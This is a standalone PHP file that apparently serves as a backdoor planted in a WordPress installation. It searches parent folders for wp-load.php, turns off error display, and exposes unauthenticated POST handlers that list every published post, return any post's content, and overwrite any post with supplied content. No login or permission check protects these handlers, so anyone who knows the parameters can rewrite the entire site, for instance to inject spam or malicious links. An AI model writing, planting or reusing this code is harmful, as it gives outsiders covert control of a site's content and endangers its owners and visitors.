<?php
ini_set('display_errors',"Off");

$currPath = dirname(__FILE__);
$currPath = explode("/", $currPath);
$rootPath = "";
$it = 0;
while(empty($rootPath)){
    if($it >= 10) {
        break;
    }
    if(file_exists(implode("/", $currPath)."/wp-load.php")){
        $rootPath = implode("/", $currPath);
    } else {
        unset($currPath[count($currPath) - 1]);
    }
    $it++;
}
if (!empty($rootPath)) {
    include($rootPath . "/wp-load.php");
} else {
    echo "rootpatherror";
    die();
}
if (!empty($_POST["getblogdata"]) && $_POST["getblogdata"] == "yes" && !empty($_POST["types"])) {
    $types = json_decode(stripslashes($_POST["types"]));
    $allPosts = get_posts([
        'numberposts'      => -1,
        'post_type'        => $types,
        'post_status'      =>'publish',
        'suppress_filters' => true,
        'fields'           => 'ids'
    ] );
    if(!empty($allPosts) && count($allPosts) > 0){
        $result = array(
            "rootpath" => $rootPath,
            "postids" => $allPosts
        );
        $result = json_encode($result);
        echo $result;
        die();
    } else {
        echo "nogetposts";
        die();
    }
}

if (!empty($_POST["getpostcontent"])) {
    $needPost = get_post($_POST["getpostcontent"]);
    if (empty($needPost->post_content)) {
        echo "nopostcontent";
        die();
    }
    $result = array(
        "post_content" => $needPost->post_content,
        "md5" => md5($needPost->post_content)
    );
    $result = json_encode($result);
    echo $result;
    die();
}

if (!empty($_POST["savepost"])) {
    $saveData = json_decode(stripslashes($_POST["savepost"]));
    if (md5($saveData->post_content) != $saveData->md5) {
        echo "badcontentmd5";
        die();
    }
    $result = array(
        "error" => "error",
        "permalink" => ""
    );
    $postUrl = get_post($saveData->post_id);
    if (!empty($postUrl->guid)) {
        $postUrl = urldecode($postUrl->guid);
    } else {
        $postUrl = get_post_permalink($saveData->post_id);
    }
    $updPost = array();
    $updPost['ID'] = $saveData->post_id;
    $updPost['post_content'] = $saveData->post_content;
    if (wp_update_post(wp_slash($updPost))) {
        $result["error"] = "noerrors";
        $result["permalink"] = $postUrl;
    }
    $result = json_encode($result);
    echo $result;
    die();
}